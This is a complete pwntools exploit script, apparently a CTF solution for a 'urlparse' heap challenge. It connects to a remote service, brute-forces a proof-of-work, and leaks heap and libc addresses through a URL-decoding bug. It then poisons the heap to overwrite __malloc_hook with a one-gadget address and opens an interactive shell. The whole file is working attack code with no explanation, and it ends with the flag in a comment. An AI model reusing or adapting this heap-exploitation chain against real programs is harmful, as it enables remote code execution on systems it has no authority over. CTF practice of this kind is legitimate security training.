from pwn import *
from ctypes import *
import urllib 
import hashlib
from hashlib import sha256

DEBUG = 0
if DEBUG:
     p = process('./urlparse')
     #scontext.log_level = 'debug'
     #libc = ELF('/lib32/libc-2.24.so')
     #p = process(['./babystack.dms'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc_64.so.6')})
     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
     
else:
     p = remote('47.75.4.252',10013)
     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
     #libc = ELF('libc_64.so.6')
#context.log_level = 'debug'
wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open('/proc/%s/mem' % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink('/proc/%s/exe' % pid)
   with open('/proc/%s/maps' % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split('-')[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def debug(addr):
    global mypid
    mypid = proc.pidof(p)[0]
    #raw_input('debug:')
    
    with open('/proc/%s/mem' % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        print "program_base",hex(moduleBase)
        gdb.attach(p, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))

def proof():
  data=p.recvuntil('== ')
  data=data[-21:-5]
  sha=p.recv(64)
  print 'data=',data
  print 'sha256=',sha
  charset = range(ord('a'), ord('z')+1) + range(ord('0'), ord('9') +1)+range(ord('A'), ord('Z')+1)
  for i in charset:
    for j in charset:
      for k in charset:
        for l in charset:
          temp = chr(i)+chr(j)+chr(k)+chr(l)+data
          if sha256(temp).hexdigest() == sha:
            answer=chr(i)+chr(j)+chr(k)+chr(l)
            info(chr(i)+chr(j)+chr(k)+chr(l))
            p.send(answer+'\n')
            break


def create(size,url):
    p.recvuntil('========\n')
    p.sendline('1')
    p.recvuntil('size: ')
    p.sendline(str(size))
    p.recvuntil('URL: ')
    p.send(url)

def encode(idx):
    p.recvuntil('========\n')
    p.sendline('2')
    p.recvuntil('index: ')
    p.sendline(str(idx))

def decode(idx):
    p.recvuntil('========\n')
    p.sendline('3')
    p.recvuntil('index: ')
    p.sendline(str(idx))

def delete(idx):
    p.recvuntil('========\n')
    p.sendline('5')
    p.recvuntil('index: ')
    p.sendline(str(idx))

def show():
    p.recvuntil('========\n')
    p.sendline('4')
    
    
#free 0x134d
def pwn():
    #str2 = parse.quote(str1)   
    proof()
    #str3 = parse.unquote(str2)
    #print urllib.unquote('%\x60\x60') 
    #raw_input()
    # leak heap addr
    create(0x20,'4'+'\n')
    create(0x400,'3'*99+'\n')  #
    create(0x20,'2'+'\n')
    create(0x420,'1'+'\n')  #
    create(0x3e0,'0'+'\n')  #
    delete(3)
    delete(1)
    create(0x500,'a'+'\n')
    #stri='1'*5+'%'
    data='1'*5+urllib.quote('%')
    print data
    #debug(0x127a)
    create(0x30,data+'\n')
    decode(0)
    show()
    p.recvuntil(': ')
    p.recvuntil('1'*5)
    heap_addr=u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))-0x470
    print "heap addr",hex(heap_addr)
    delete(0)
    #delete(1)
    delete(0)
    delete(0)
    delete(0)
    delete(0)
    create(0x500,'a'+'\n')
    delete(0)
    #create(0,)
    #encode(1)
    
    #leak libc addr
    #debug(0x1118)
    create(0x100,'1'*32+'11111'+urllib.quote('%')+'\n')
    create(0x100,'1'+'\n')
    create(0x100,'0'+'\n')
    
    #debug(0x1231)
    decode(0x2)
    show()
    p.recvuntil('2: ')
    p.recvuntil('1'*(32+5))
    libc_base=u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))-0x3c4b78
    print "libc base",hex(libc_base)
    delete(2)
    delete(1)
    delete(0)
    
    #debug(0xcfc)
    #create(0x30,'2'*40+'2'*5+urllib.quote('%')+'\n')
    create(0x20,'2'+'\n')
    #data='a'*(0x2520-8)+urllib.quote(urllib.quote(p64(0)))+urllib.quote(urllib.quote(p64(0x6060-0x2530)))+'\n'
    #debug(0x1231)
    create(0x6050,'1'+'\n')
    
    
    create(0x100,'1'*0x20+'1'+urllib.quote(urllib.quote('%'))+'1'+'\n') #4
    create(8,'1'+'\n') #3
    #debug(0x1231)
    #delete(2)
    delete(2)
    create(0x2500-0x10,'1'+'\n')
    create(0x100,'a'*(0x20-8)+urllib.quote(urllib.quote(p64(0x2530)))+urllib.quote(urllib.quote(p64(0x6060-0x2530)))+'\n')
    decode(0)
    delete(0)
    delete(0)
    
    create(0x100,'1'*0x20+'1'+urllib.quote(urllib.quote('%'))+'1'+'\n')
    delete(0)
    delete(2)
    create(0x20,'1'*10+'1'*14+'2'*5+'%%')# 1
    #debug(0x11b1)
    encode(0)
    #debug(0x103a)
    create(0x100,'1'+'\n')
    create(0x60,'2'+'\n') #0
    delete(1)
    #debug(0x103a)
    delete(3)
    #delete(0)
    #create(0x2390,'1'+'\n')
    malloc_hook_chunk=libc_base+libc.symbols['__malloc_hook']-0x1b-0x8
    create(0x6160,'1'*(0x100-8)+urllib.quote(urllib.quote(p64(0)))+urllib.quote(urllib.quote(p64(0x70)))+urllib.quote(urllib.quote(p64(malloc_hook_chunk)))+'\n')
    create(0x23a0,'1'+'\n')
    #debug(0x134d)
    #decode(0)
    #delete(1)
    
    decode(1)
    delete(1)
    delete(1)
    #debug(0x103a)
    create(0x200,'1'*(0x100-8)+urllib.quote(urllib.quote(p64(0)))+urllib.quote(urllib.quote(p64(0x70)))+urllib.quote(urllib.quote(p64(malloc_hook_chunk)))+'\n')
    decode(0)
    create(0x60,'a'+'\n')
    rce=libc_base+0xf1147
    create(0x60,'a'*0xb+urllib.quote(urllib.quote(p64(rce)))+'\n')
    #debug(0x1231)
    decode(0)
    p.sendline('1\n')
    p.sendline('20\n')
    p.interactive()
    

if __name__ == '__main__':
   pwn()

#*ctf{ur1 p4rse fl4g 2233333!}

 

    
